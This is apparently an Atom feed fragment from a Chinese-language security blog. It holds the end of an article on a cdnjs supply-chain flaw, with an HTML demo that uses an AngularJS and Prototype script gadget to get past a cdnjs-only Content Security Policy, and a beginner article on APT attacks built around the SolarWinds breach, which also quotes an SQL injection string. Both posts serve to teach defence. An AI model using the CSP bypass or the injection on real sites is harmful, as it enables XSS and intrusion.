&lt;p&gt;所以如果要完全避免這個風險，就是不要用這些第三方提供的服務，把這些 library 放到自己家的 CDN 上面去，這樣風險就從第三方的風險，變成了自己家服務的風險。除非自己家的服務被打下來，不然這些 library 應該不會出事。&lt;/p&gt;
&lt;p&gt;而現在許多網站因為 library 都會經由 webpack 這類型的 bundler 重新切分，所以沒有辦法使用第三方的 library CDN，一定會放在自己家的網站上，也就排除了這類型的供應鏈攻擊。&lt;/p&gt;
&lt;p&gt;可是要注意的是，你仍然避免不了其他供應鏈攻擊的風險。因為儘管沒有用第三方的 library CDN，還是需要從別的地方下載這些函式庫對吧？例如說 npm，你的函式庫來源可能是這裡，意思就是如果 npm 被入侵了，上面的文件被竄改，還是會影響到你的服務。這就是供應鏈攻擊，不直接攻擊你，而是從其他上游滲透進來。&lt;/p&gt;
&lt;p&gt;不過這類型的風險可以在 build time 的時候透過一些靜態掃描的服務，看能不能抓出被竄改的檔案或是惡意程式碼，或也有公司會在內部架一個 npm registry，不直接與外面的 npm 同步，確保使用到的函式庫不會被竄改。&lt;/p&gt;
&lt;h2 id=&quot;%E9%A1%8D%E5%A4%96%E9%A2%A8%E9%9A%AA%EF%BC%9Acsp-%E7%9A%84%E7%B9%9E%E9%81%8E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A1%8D%E5%A4%96%E9%A2%A8%E9%9A%AA%EF%BC%9Acsp-%E7%9A%84%E7%B9%9E%E9%81%8E&quot;&gt;#&lt;/a&gt; 額外風險：CSP 的繞過&lt;/h2&gt;
&lt;p&gt;除了上面提到的供應鏈安全風險以外，其實使用第三方 JS 還有另一個潛在風險，就是 CSP(Content Security Policy) 的繞過。現在有許多網站都會設置 CSP，阻擋不信任的來源，例如說只允許某個 domain 的 JS 檔案，或是不開放 inline event 跟 eval 等等。&lt;/p&gt;
&lt;p&gt;如果你的網站有用到 cdnjs 的腳本，你的 CSP 裡面勢必會有 &lt;code&gt;https://cdnjs.cloudflare.com&lt;/code&gt; 這個網址。比起完整的路徑，比較多人會傾向允許整個 domain 的東西，因為你可能用到多個 library，懶得一個一個新增上去。&lt;/p&gt;
&lt;p&gt;這時候若是網站有著 XSS 漏洞，一般情況下 CSP 應該會有防禦作用，阻止這些不信任的程式碼的執行。但很遺憾地，CSP 中 &lt;code&gt;https://cdnjs.cloudflare.com&lt;/code&gt; 的這個路徑，讓攻擊者可以輕鬆繞過 CSP。&lt;/p&gt;
&lt;p&gt;先講一下原理，原理就是 cdnjs 上除了你想要用的 library 之外，還有千千萬萬個不同的 library，而有些 library 本身提供的功能，讓攻擊者不需要執行 JS，也能執行任意程式碼。&lt;/p&gt;
&lt;p&gt;例如說 AngularJS，在舊版本中有著 &lt;a href=&quot;https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs&quot;&gt;Client-Side Template Injection&lt;/a&gt; 的漏洞，只需要 HTML 就可以執行程式碼，像是這類「利用其他合法的 script 幫助你執行攻擊程式碼」的手法，叫做 script gadgets，想知道更多可以參考：&lt;a href=&quot;https://github.com/google/security-research-pocs/tree/master/script-gadgets&quot;&gt;security-research-pocs/script-gadgets&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;假設我們現在的 CSP 只允許 &lt;code&gt;https://cdnjs.cloudflare.com&lt;/code&gt;，該怎麼繞過呢？我找到這兩個很棒的資源：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.0daylabs.com/2016/09/09/bypassing-csp/&quot;&gt;Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it&#39;s-CSP!%22&quot;&gt;H5SC Minichallenge 3: &amp;quot;Sh＊t, it&#39;s CSP!&amp;quot;&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;只要利用 AngularJS + Prototype 這兩個 library，就可以在符合 CSP（只引入 cdnjs 底下的腳本）的情況下進行 XSS，我做了一個簡單的 demo：&lt;a href=&quot;https://aszx87410.github.io/demo/csp_bypass/cdnjs.html&quot;&gt;https://aszx87410.github.io/demo/csp_bypass/cdnjs.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;完整程式碼如下：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;en&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;utf-8&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;CSP bypass&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;http-equiv&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;Content-Security-Policy&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;default-src &lt;span class=&quot;token punctuation&quot;&gt;&#39;&lt;/span&gt;none&lt;span class=&quot;token punctuation&quot;&gt;&#39;&lt;/span&gt;; script-src https://cdnjs.cloudflare.com&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;ng-app&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;ng-csp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;      &lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;想要避免這種 CSP bypass，就只能把 CSP 中 cdnjs 的路徑寫死，把整個腳本的 URL 寫上去，而不是只寫 domain。否則，這類型的 CSP 其實會幫助攻擊者更容易突破 CSP 的限制，進而執行 XSS 攻擊。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;攻擊手法千千百百種，發現 cdnjs 漏洞的研究員近期鍾情於 supply chain attack，不只 cdnjs，連 &lt;a href=&quot;https://blog.ryotak.me/post/homebrew-security-incident-en/&quot;&gt;Homebrew&lt;/a&gt; 跟 &lt;a href=&quot;https://blog.ryotak.me/post/pypi-potential-remote-code-execution-en/&quot;&gt;PyPI&lt;/a&gt; 甚至是 &lt;a href=&quot;https://blog.ryotak.me/post/definitelytyped-tamper-with-arbitrary-packages-en/&quot;&gt;@types&lt;/a&gt; 也都被找到漏洞。&lt;/p&gt;
&lt;p&gt;如果要直接在頁面上用 script 引入第三方的網址，記得先確認對方的網站是值得信任的，如果可以的話也請加上 integrity 屬性，避免檔案被竄改，連帶影響到自己的服務。也要注意 CSP 的設定，對於 cdnjs 這種網站，若是只設置 domain 的話，已經有了可行的繞過手法，在設置前請多加注意。&lt;/p&gt;
&lt;p&gt;在談到前端的安全時，大家第一個會想到 XSS，第二個會想到 CSRF，然後可能就沒了。這篇文章希望藉由 cdnjs 的漏洞讓前端工程師們認識什麼是供應鏈攻擊。只要有意識到這個攻擊手法，日後在開發時就會多留意一些，就會注意到引入第三方 library 所帶來的風險。&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>零基礎資安系列（六）- 電影中酷駭客做的事？關於 APT（Advanced Persistent Threat）</title>
		<link href="https://tech-blog.cymetrics.io/posts/jo/zerobased-APT/"/>
		<updated>2021-08-22T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/jo/zerobased-APT/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;電影中的駭客只是敲敲打打幾分鐘就可以竊取商業機密？！&lt;/strong&gt;&lt;br&gt;
答案是但也不是，為什麼會這麼說呢？&lt;br&gt;
成功的攻擊結果也許只需要短短的幾分鐘就能將商業機密帶走，但在駭客敲鍵盤的那幾分鐘之前，其實就已經花了好幾個月甚至以年記的時間來佈局這幾分鐘的攻擊，那駭客的佈局到底是在佈局什麼呢，這就是今天想和大家分享的，電影中那些酷駭客在完成攻擊前所做的事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E9%87%8B%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%87%8B%E4%BE%8B&quot;&gt;#&lt;/a&gt; 釋例&lt;/h2&gt;
&lt;p&gt;電影中，駭客所執行的方式，其實在業界稱之為&lt;strong&gt;進階持續性威脅（Advanced Persistent Threat）&lt;/strong&gt; 也就是所謂的 APT，那這種攻擊厲害在哪呢？&lt;br&gt;
其實 APT 並不是一種攻擊手法，而是一整套的攻擊手法及流程彙整，舉個例來說，葉問開始學習武術，攻擊的手法不外乎便是左勾拳（Phishing）、右勾拳（OS injection），而當他將這些攻擊進行&lt;strong&gt;變化&lt;/strong&gt;並且&lt;strong&gt;整合&lt;/strong&gt;起來，摸索出克敵之道成為流派之後，便可以稱之為 詠春（APT）！，額外說明一下 APT 與攻擊鏈概念很像，所以我會在下面說明 APT 所擁有的要素和案例說明。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-APT/p1.jpeg&quot;&gt;&lt;figcaption&gt;&lt;p&gt;photo by 電影-葉問&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;apt%EF%BC%88advanced-persistent-threat%EF%BC%89%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#apt%EF%BC%88advanced-persistent-threat%EF%BC%89%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F&quot;&gt;#&lt;/a&gt; APT（Advanced Persistent Threat）是什麼？&lt;/h2&gt;
&lt;p&gt;開宗明義，APT 就是以&lt;strong&gt;進階有變化&lt;/strong&gt;的攻擊手法，&lt;strong&gt;持續並嘗試不被發現&lt;/strong&gt;的入侵目標，並且竊取資料掌控系統&lt;strong&gt;對目標造成威脅&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;%E4%B8%8A%E9%9D%A2%E6%8F%90%E5%88%B0-apt-%E9%80%9A%E5%B8%B8%E6%9C%83%E5%8C%85%E5%90%AB%E4%B8%89%E7%A8%AE%E8%A6%81%E7%B4%A0%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%B8%8A%E9%9D%A2%E6%8F%90%E5%88%B0-apt-%E9%80%9A%E5%B8%B8%E6%9C%83%E5%8C%85%E5%90%AB%E4%B8%89%E7%A8%AE%E8%A6%81%E7%B4%A0%EF%BC%9A&quot;&gt;#&lt;/a&gt; 上面提到 APT 通常會包含三種要素：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;1.進階性（Advanced）&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;上勾拳無法打敗對手，但昇龍拳可以&lt;/strong&gt;&lt;br&gt;
一般使用工具執行的攻擊手法，例如 SQL Injection 的 OR 1=1--&#39; 便不算是一種進階的攻擊手法，若同樣以 SQL Injection 來舉例，可能便是透過公司的&lt;strong&gt;網路曝險&lt;/strong&gt;和相關的測試找出公司使用的資料庫類型以及版本，甚至從錯誤訊息中獲得資訊，藉以構建針對目標的 SQL Injection  payload，便可以稱為一種進階的手法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.持續性（Persistent）&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;直接放大絕招容易被閃躲，所以持續不斷的試探，讓對手露出破綻&lt;/strong&gt;&lt;br&gt;
就像是大開大闔的攻擊總是特別容易被阻擋，因此藉由緩慢而低調的各種測試和收集資訊方式，慢慢的尋找突破口，不求快速有成效，只求持續而且不被發現便可以稱為持續性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.威脅性（Threat）&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;攻擊一定會造成傷勢，攻擊可能造成的傷勢越重表示威脅性越高&lt;/strong&gt;&lt;br&gt;
駭客攻擊一定有目的，無論是直接透過勒索軟體藉此勒索贖金，或是竊取商業機密資料來獲取利益，甚至是破壞公司的服務或是客戶資料造成商譽受損，這些都是所謂的威脅性。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-APT/p2.jpeg&quot;&gt;&lt;figcaption&gt;&lt;p&gt;photo by pexels&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;apt-%E6%9C%89%E5%93%AA%E4%BA%9B%E9%9A%8E%E6%AE%B5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#apt-%E6%9C%89%E5%93%AA%E4%BA%9B%E9%9A%8E%E6%AE%B5&quot;&gt;#&lt;/a&gt; APT 有哪些階段&lt;/h3&gt;
&lt;p&gt;簡化來說可以分成五個階段&lt;br&gt;
&lt;strong&gt;選擇目標：&lt;/strong&gt;&lt;br&gt;
此階段有各種可能性，無論是因為企業曝光率高，或是競爭對手的僱傭甚至是網路曝險的資訊都有可能導致企業成為駭客的攻擊標的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;收集資訊：&lt;/strong&gt;&lt;br&gt;
透過各式各樣的工具以及攻擊手法，收集攻擊目標可能導致風險的弱點。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;執行滲透：&lt;/strong&gt;&lt;br&gt;
嘗試將所有收集到的弱點串起，執行攻擊鍊達成階段性的目的，依據不同的最終目的，此階段的目標都可能不同，可能是獲取內部的帳號以及將帳號的權限提高，或者是控制防禦機制，也可能是植入後台收集資訊，或是將散播惡意腳本，此階段通常需要花費許多的時間進行持續性的測試，並且必須低調不能被發現。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分析資訊：&lt;/strong&gt;&lt;br&gt;
藉由在內部中滲透後獲取的資料進行分析，此階段獲取的資訊有可能是透過帳號提權而獲得的資訊，又或者是埋入後門之後長期收集的資訊進行分析，也可能是漸進性的社交工程，由普通員工到人資到管理階層後收集到的資訊執行分析，確認這些資訊是否足夠讓駭客達成最終目的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;獲取成果：&lt;/strong&gt;&lt;br&gt;
在這個階段就是大家在電影中所看到的，駭客敲擊幾分鐘的鍵盤，便看到系統被駭客完全掌控，或者是機密資料通通被下載備份。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-APT/p3.jpeg&quot;&gt;&lt;figcaption&gt;&lt;p&gt;photo by pexels&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E5%AF%A6%E4%BE%8B%E8%AA%AA%E6%98%8E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%AF%A6%E4%BE%8B%E8%AA%AA%E6%98%8E&quot;&gt;#&lt;/a&gt; 實例說明&lt;/h3&gt;
&lt;p&gt;以去年最有名的 SolarWinds 供應鏈攻擊來說明以上階段，這個攻擊事件受害者包括全球最大安全軟體公司之一FireEye以及美國財政部與商務部，以下引號為引用新聞內容，說明結束後會附上新聞連結。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;”SolarWinds自2020年3月到6月之間，推出的 Orion 軟體存在名為 SunBurst 的後門，駭客用來於遭感染的系統監控受害組織，同時能夠執行任意指令。“&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;選擇目標：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“SolarWinds是美國的軟體開發商，研發網路系統及資訊科技基礎設施的軟體，根據官網說明，客戶包括全美五百大企業中的425家、前十大電信業者、美國軍方、美國國防部、國務院、NSAS、國安局、郵政服務、司法部，以及美國總統辦公室。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這裏可以確定的是目標如果得手，等於間接獲取許多大企業的機敏資訊，至於為什麼會選擇 SolarWinds 就不得而知，有可能是透過層層的篩選目標，包含攻擊成功可能性以及網路曝險程度以及資料保護程度而定。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;收集資訊：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如上一階段所說，此階段與&lt;strong&gt;選擇目標&lt;/strong&gt;習習相關，舉例來說，駭客可能最初是鎖定了美國幾大知名的軟體開發商，接著透過各式各樣的工具以及攻擊手法，收集攻擊目標可能導致風險的弱點，去判斷攻擊成功可能性以及網路曝險程度以及資料保護程度之後，才選擇最終目標，接著再強化收集資訊。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;執行滲透：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;quot; SolarWinds 於2019年10月推出的舊版本（2019.4.5200.8890版）裡，駭客已經開始對 Orion 的程式進行小幅度修改，加入了後來才用到的.NET類別（OrionImprovement BusinessLayer），而此時，駭客尚未植入後門的程式碼，ReversingLabs指 出，這個階段的程式碼竄改，很明顯只是概念性驗證攻擊（PoC）。&lt;br&gt;
駭客大致的攻擊計畫，可區分成3個階段：首先，是駭入開發系統，一旦成功，攻擊者接著會注入自己的程式碼，最後查核他們簽署的軟體套件，是否會派送到 Orion 軟體的用戶端。&lt;br&gt;
在駭客植入惡意程式碼的過程中，為了要瞞過  SolarWins 的開發人員，不讓攻擊行動被察覺，他們故步疑陣，採取了許多幾可亂真的做法，來模仿 SolarWinds 開發方式。&lt;br&gt;
例如，在加入 Orion 程式碼的其中一個類別，其名稱駭客就刻意命名為 OrionImprovement BusinessLayer，而讓該公司的軟體開發者與稽核人員，認為是正常的物件。&lt;br&gt;
駭客不只是模仿 SolarWinds 開發團隊的物件命名方式，ReversingLabs 進一步指出，駭客還在此類別中，引用了確實存在於 Orion 程式碼的方法（Method）與程式庫，而這樣的精細手法，同樣存在於這些駭客其他植入的方法。由此可見，駭客應該對於 SolarWinds 基礎程式庫的架構，可說是極為熟悉。“&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;除了獲得駭入開發系統的權限，也許是透過社交工程或是透過服務逆向獲取權限，也可以看到駭客為了執行攻擊，花時間了解 SolarWinds 基礎程式庫的架構並模仿物件命名方式並引用確實存在於 Orion 程式碼的方法（Method）與程式庫，以上的攻擊都是需要花費許多的時間研究並且執行多次的測試才有可能成功。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分析資訊：&lt;/strong&gt;&lt;br&gt;
在這個攻擊事件中，駭客在攻擊過程需要不斷的學習 SolarWinds 基礎程式庫的架構，並且確保自己的修改沒有被發現，不斷的執行 POC ，分析結果並確認攻擊的有效性，並且透過一次次的 POC ，從中獲得資訊，反覆的分析和修改攻擊手法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;獲取成果：&lt;/strong&gt;&lt;br&gt;
最後在許多新聞報導及事件研究中可以看到，駭客除了獲取了 FireEye 的紅隊測試工具以外，也獲取了特定政府客戶的資料，並且也成功存取「部份」內部系統。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;參考資料連接：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/141651&quot;&gt;報導：國家級駭客透過供應鏈攻擊美國財政部與商務部&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://www.ithome.com.tw/news/141753&quot;&gt;資安廠商分析 SolarWinds 供應鏈攻擊後門程式，研判駭客自去年底開始攻擊&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-APT/p4.jpeg&quot;&gt;&lt;figcaption&gt;&lt;p&gt;photo by pexels&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;apt-%E6%9C%89%E8%BE%A6%E6%B3%95%E9%98%B2%E7%A6%A6%E5%97%8E%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#apt-%E6%9C%89%E8%BE%A6%E6%B3%95%E9%98%B2%E7%A6%A6%E5%97%8E%EF%BC%9F&quot;&gt;#&lt;/a&gt; APT 有辦法防禦嗎？&lt;/h2&gt;
&lt;p&gt;雖然 APT 攻擊有針對性而且客製化的特性，與一般防毒軟體與防火牆的偵測特徵碼的防護機制不盡相同，也因為擁有如此多型態和面向，所以對於企業來說十分難以預防，不過其實仍然能夠從幾個方面來提高駭客成功入侵的難度：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;對於威脅情資和漏洞資訊的了解，進行風險管理，掌握系統漏洞修補及軟體版本更新。&lt;/li&gt;
&lt;li&gt;針對企業內部所有的權限機制進行控管，細化每個人擁有的權限。&lt;/li&gt;
&lt;li&gt;執行事件記錄包括保留系統及檔案伺服器的存取紀錄，確保問題發生時，能第一時間發現並追蹤問題。&lt;/li&gt;
&lt;li&gt;執行如社交工程演練的資安測試及課程，強化全員資安意識。&lt;/li&gt;
&lt;li&gt;定期執行網路曝險以及弱點掃描、滲透測試等，確保企業對於自身服務以及狀態，除了提高駭客的攻擊難度以外，也能在層層篩選中避免成為最終標的。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;%E5%B0%8F%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B0%8F%E7%B5%90&quot;&gt;#&lt;/a&gt; 小結&lt;/h2&gt;
&lt;p&gt;介紹了什麼是 APT ，也以實例說明流程之後，也許有人會產生這根本防不勝防的無力感，不過魔高一尺道高一丈，其實已經有組織分析了知名的駭客組織 APT 手法，並且將這些手法分類歸納，以此建立資安框架，除了將威脅和入侵的描述一致化以外，也有助攻防演練以及資安產品的驗證，而這其實也是我下一篇文章想要說明的重點，希望可以讓大家對於 APT 有更充分的了解，建立更豐富的資安知識庫。&lt;/p&gt;
&lt;h2 id=&quot;%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;#&lt;/a&gt; 延伸閱讀&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-exposure/&quot;&gt;資安科普番外篇（一）-大意了啊沒有閃！常見網站曝險你中了幾項？！&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
